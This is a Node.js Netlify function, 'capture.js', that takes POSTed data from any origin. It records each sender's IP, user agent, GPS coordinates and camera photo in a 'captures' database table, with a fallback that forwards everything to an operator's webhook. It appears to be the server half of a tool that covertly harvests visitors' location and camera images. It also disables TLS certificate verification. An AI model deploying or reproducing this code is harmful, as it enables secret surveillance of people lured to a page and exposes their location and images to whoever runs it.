// netlify/functions/capture.js
const { createClient } = require('@supabase/supabase-js');

// Option A: Supabase (PostgreSQL) - RECOMMENDED
// Option B: Simple file logging (Netlify deployment log only)
// Option C: Send to your own SQL database via connection string

// ========== CONFIG ==========
const USE_SUPABASE = process.env.SUPABASE_URL && process.env.SUPABASE_KEY;
const USE_SQLITE  = false; // Netlify doesn't support persistent SQLite

// Supabase client (PostgreSQL)
let supabase = null;
if (USE_SUPABASE) {
    supabase = createClient(
        process.env.SUPABASE_URL,
        process.env.SUPABASE_SERVICE_KEY // Use service_role key for backend
    );
}

// PostgreSQL connection string (alternative to Supabase)
const PG_CONNECT = process.env.DATABASE_URL || null;
let pgPool = null;
if (PG_CONNECT) {
    const { Pool } = require('pg');
    pgPool = new Pool({ connectionString: PG_CONNECT, ssl: { rejectUnauthorized: false } });
}

exports.handler = async (event, context) => {
    // CORS headers
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: 'OK' };
    }

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);

        // Add server-side timestamp and request IP
        data.server_timestamp = new Date().toISOString();
        data.client_ip = event.headers['client-ip'] || 
                         event.headers['x-forwarded-for'] || 
                         data.ip || 'unknown';

        // Log to Netlify console (viewable in function logs)
        console.log('=== CAPTURED DATA ===');
        console.log(JSON.stringify(data, null, 2));

        // Store result
        let stored = false;

        // Option 1: Supabase (PostgreSQL via hosted service)
        if (supabase) {
            const { error } = await supabase
                .from('captures')
                .insert([{
                    data: data,
                    ip: data.client_ip,
                    user_agent: data.ua,
                    timestamp: data.timestamp,
                    gps_lat: data.gps?.lat || null,
                    gps_lng: data.gps?.lng || null,
                    has_photo: !!data.photo,
                    photo_data: data.photo || null,
                    gps_error: data.gpsError || null,
                    camera_error: data.cameraError || null
                }]);
            if (!error) stored = true;
            else console.error('Supabase insert error:', error);
        }

        // Option 2: Direct PostgreSQL
        if (!stored && pgPool) {
            const query = `
                INSERT INTO captures (
                    data, ip, user_agent, timestamp,
                    gps_lat, gps_lng, has_photo, photo_data,
                    gps_error, camera_error
                ) VALUES (
                    $1::jsonb, $2, $3, $4,
                    $5, $6, $7, $8,
                    $9, $10
                )
            `;
            const values = [
                JSON.stringify(data),
                data.client_ip,
                data.ua,
                data.timestamp,
                data.gps?.lat || null,
                data.gps?.lng || null,
                !!data.photo,
                data.photo || null,
                data.gpsError || null,
                data.cameraError || null
            ];
            try {
                await pgPool.query(query, values);
                stored = true;
            } catch (pgErr) {
                console.error('PG insert error:', pgErr);
            }
        }

        // Option 3: Webhook fallback (send to your server)
        if (!stored && process.env.WEBHOOK_URL) {
            try {
                await fetch(process.env.WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                stored = true;
            } catch(e) {}
        }

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ 
                success: true, 
                stored,
                id: data.timestamp 
            })
        };
    } catch (err) {
        console.error('Function error:', err);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ success: false, error: err.message })
        };
    }
};